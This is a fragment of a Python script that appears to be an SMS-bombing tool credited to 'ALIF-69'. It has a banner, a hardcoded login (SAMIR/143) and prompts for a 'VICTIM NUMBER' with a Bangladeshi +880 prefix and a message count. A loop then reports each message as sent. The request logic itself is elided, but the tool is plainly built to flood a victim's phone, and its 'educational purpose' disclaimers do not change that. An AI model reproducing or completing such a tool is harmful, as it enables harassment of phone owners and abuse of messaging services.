...
\033[1;32m[-] AUTHOR       :\033[1;32m ALIF-69
\033[1;32m[-] GITHUB        :\033[1;32m CYBER-ALIF
\033[1;32m[-] FACEBOOK  :\033[1;32m MISSION 69
...
if 'SAMIR'==user and '143'==pas:
	...
	Axak(y+"\n\n\t\t      LOGIN SUCCESFULLY ")
	Axak(y+"\n\n\t\tTHIS TOOL FOR EDUCATIONAL PERPOS DONT HARM ANYONE")
...
print(f"\n{r}Note : {w}THIS TOOL FOR ONLY EDUCATION DONT HARM ANYONE !!")
try:
...
number=input(f"{c}\n[ VICTIM NUMBER ] :{w} +880")
amo=int(input(c+"\n[ AMOUNT ] : "+w))
xak(f"\n\n\t {w}<{r}/{w}> {g}STAY WITH ALIF-69  {w}<{r}/{w}>\n\n")
...
for i in range(amo):
	...
	print(f"ntt {ran2}✌️SENT SUCCESFULLY  BY 🔥ALIF-69🔥 "+w+tim)
